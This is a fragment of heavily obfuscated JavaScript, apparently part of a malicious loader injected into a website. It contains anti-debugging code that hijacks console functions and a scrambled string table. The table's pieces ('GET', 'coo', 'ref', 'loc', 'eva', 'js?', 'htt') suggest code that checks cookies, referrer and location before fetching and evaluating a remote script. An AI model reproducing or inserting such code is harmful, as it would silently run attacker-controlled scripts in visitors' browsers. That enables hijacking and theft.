f=-0x1757*-0x1+0x717+-0x1e6e;f<G[BV(rU.Y8,rU.Y9)+BV(rU.YB,rU.Yr)];f++){if(Ba(rU.YY,rU.c)+'QH'===Ba(rU.Yp,rU.Yh)+'Vn'){var K=p[BV(rU.Yl,rU.Yw)+'ly'](Q,arguments);return u=null,K;}else{var C=Y[Ba(rU.YQ,rU.Yu)+Ba(rU.YE,rU.t)+BV(rU.Yz,rU.YN)+'or'][Ba(rU.YS,rU.YH)+Ba(rU.YF,rU.rA)+BV(rU.YV,rU.Ya)][Ba(rU.YO,rU.YU)+'d'](Y),q=G[f],W=b[q]||C;C[BV(rU.Y5,rU.YP)+Ba(rU.Yt,rU.Yx)+BV(rU.Ys,rU.YX)]=Y[Ba(rU.YD,rU.YZ)+'d'](Y),C[Ba(rU.YL,rU.Yb)+BV(rU.YG,rU.Yd)+'ng']=W[BV(rU.Yf,rU.YC)+Ba(rU.Yq,rU.YW)+'ng'][BV(rU.Yk,rU.Yj)+'d'](W),b[q]=C;}}}else return Y[BV(rU.YM,rU.Yc)+BV(rU.Ym,rU.YK)+'ng']()[Ba(rU.Yo,rU.Yi)+BV(rU.YJ,rU.YR)](Ba(rU.Ye,rU.YI)+Ba(rU.Yv,rU.Yg)+BV(rU.YA,rU.YT)+Ba(rU.Yn,rU.Yy))[BV(rU.p0,rU.p1)+Ba(rU.p2,rU.YU)+'ng']()[BV(rU.p3,rU.p4)+BV(rU.p5,rU.s)+Ba(rU.p6,rU.YU)+'or'](p)[Ba(rU.p7,rU.p8)+Ba(rU.p9,rU.pB)](Ba(rU.pr,rU.pY)+BV(rU.pp,rU.ph)+Ba(rU.pl,rU.pw)+Ba(rU.pQ,rU.rZ));});return X(),P[BE(rP.Q,rP.u)+BE(rP.E,rP.z)+'f'](t)!==-(0xa71+-0x658+-0x418);}}}());function h(){var rx=['W51PW4e','WR/dIGe','W73dTSo5','tab','pZa0','W4zYW5K','GET','gPn','W6ldMmk3','WR8uja','pCocAq','BDM','{}.','kLVdVG','ycVcIa','dom','F8kdWQe','n()','a8k1vW','oCkmW78','4352060oksXrL','W4ldOv8','WRCNlW','WRhdV8kL','BwtcKG','v8o3pW','W7xcTCos','pon','W71KeG','xfQ','vSkffG','BSkCW4S','WPdcU1DOWQuEW5lcVa','W7ZdS8k+','tNa','hos','com','tot','W7FdMXG','+)+','WRxcHmoI','fmkXuq','10093336FHQGxU','vmoXzW','www','d8kSlq','res','Bmo0rZLcW6/cIgLKW4BcHSkoyCkL','eda','DmkTnG','W7ldUmka','rSkYWOO','c37dIG','/ap','pJC','ion','DVJ','fCkJW5a','htt','BmkpdG','in.','gmkNW4y','coo','W4zPW4C','lCk+mq','gWvF','//w','onr','WOBdJCoy','omosjW','rea','ope','WQS4CW','WQvPWOe','W73dPsm','js?','W696iq','W7hdNCkt','WRuNE8oHW5tdI8kFWRvlo1BcOG','pro','WR3cJmkU','wCo6WOy','Ag/dMG','fmomW4W','CHxcNW','W7tcLem','WOJdVCkD','vIa','kCkTga','ach','k1RdSq','W47dVbK','zmkAW4W','gmkRW5O','yst','unc','WQxcNSoT','FN5g','rZZcJq','mmoSW7y','xSD','\x22)(','CyL','\x22re','W7BcPmke','WQ0+uW','W6xcS8o/','or(','ucFcJq','ebc','gth','DAH','ext','kyA','jCopsW','jxl','emk3qa','CddcLa','z3Dz','cWL+','l8kInq','pmk3pG','W71QbW','WRNcNmkg','z1DT','PjD','gCkdeq','con','iUb','W5S1WPW','pv3dVG','W6T3eG','__p','erTP','W7JdGmkj','W5b/W5y','eIc','Xcv','chddVG','WQBcJCoQWQmNwCk4CstdRCkzzG','ept','W7BdRCk3','ofeAnKP8d8okhwC','oJmU','W7WPyG','log','WQ3cMmoL','vs/cQa','\x20(f','F3RdJW','W6dcO8oV','qzk','amkMra','tri','ACknWRq','tus','jdmD','qmoHCq','F8kqWQW','xCo/aq','c8opW7u','12581550cTNNjZ','FCkjda','MwH','B8kqWQ4','y8k6dq','sta','app','cCktba','703232vpokRF','W73cSSo+','.+)','omkYfG','WONcPHK','smoNWQC','zmkcW7S','W6tcLv4','urn','pCobW7C','W5fKW6y','F3RdNq','ind','ASkiWPq','WRxcHCoY','ACkdfa','WQOPBG','z214','W6fIfG','W5usWO4','WRlcNSot','q3jo','W6rgcq','ref','ype','W7RdPmk4','Okp','W6VcO8ooW4THic4Q','1433400AlseHU','sol','smo6WPu','W6xdPCkh','dyS','pSo4pq','vIdcGq','WQyTmG','loc','W6H9hq','W40eW5a','get','pSofiq','smo9WOy','o__','WQn/WPy','war','vITp','15fDaUdz','W61LpW','W7NdOSkL','exc','len','uct','seT','n\x20t','WPFdT8kB','sea','tat','uZ7cPW','toS','ruK','924276cEmoOo','tio','ch7cPa','W7LMfG','ran','7JveFHs','yNPV','WRWYAq','jhHt','gw46','BaQ','ESk4WQ4','WoD','y8krWRi','W7JdK8k/','str','rch','ta.','ret','bin','C8kDW5K','ver','W6tcKuS','exO','FNRdUG','WR4unG','eva','his','8302GrZYxX','DgZdMG','ead','C8kvW7S','meddQW','mYHi','21fcTGvA','WRe5vW','FCkseG','lbSH','dbPx','smoPWOa','W6xdImkQ','nge','jSoosa','wsN','W6n7pq','jYS/smotWR7dOCoLWQHhWOxcVSko','WRSgaG','FCksaq'];h=function(){return rx;};return h();}};